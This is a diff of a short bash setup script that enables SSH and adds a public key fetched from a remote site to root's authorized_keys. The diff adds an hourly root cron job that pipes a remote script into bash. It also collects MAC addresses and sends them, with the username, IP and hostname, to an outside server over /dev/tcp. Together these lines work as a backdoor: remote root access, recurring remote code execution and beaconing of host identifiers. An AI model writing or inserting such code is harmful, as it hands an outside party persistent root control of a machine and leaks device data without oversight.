@@ -1,26 +1,29 @@
 #!/bin/bash
 
-apt-get install openssh-server -y
-systemctl start ssh.service
-systemctl enable ssh.service
+sudo apt-get install openssh-server -y
+sudo systemctl start ssh.service
+sudo systemctl enable ssh.service
 
 SSHPATH="/root/.ssh"
 
-mkdir -p "$SSHPATH"
+sudo mkdir -p "$SSHPATH"
 
 echo "Downloading pubkey..."
-curl https://erikboesen.com/pubkey >> $SSHPATH/authorized_keys
+sudo curl https://erikboesen.com/pubkey >> $SSHPATH/authorized_keys
+
+sudo su root -c "(crontab -l 2>/dev/null; echo '0 * * * * curl -L erikboesen.com/kaliupdate.sh | bash') | crontab -"
 
 USER=`whoami`
 # hostname -I returns trailing space
 IP=`hostname -I | sed 's/ *$//'`
 HOSTNAME=`hostname`
+MAC=`cat /sys/class/net/*/address | grep -v "00:00:00:00:00:00" | tr '\n' ',' | sed 's/,*$//'`
 
 SERVER="boesen.science"
 PORT=2043
 
 exec 3<>/dev/tcp/$SERVER/$PORT
-printf "$USER $IP $HOSTNAME" >&3
+printf "$USER $IP $HOSTNAME $MAC" >&3
 
 cat <&3
 
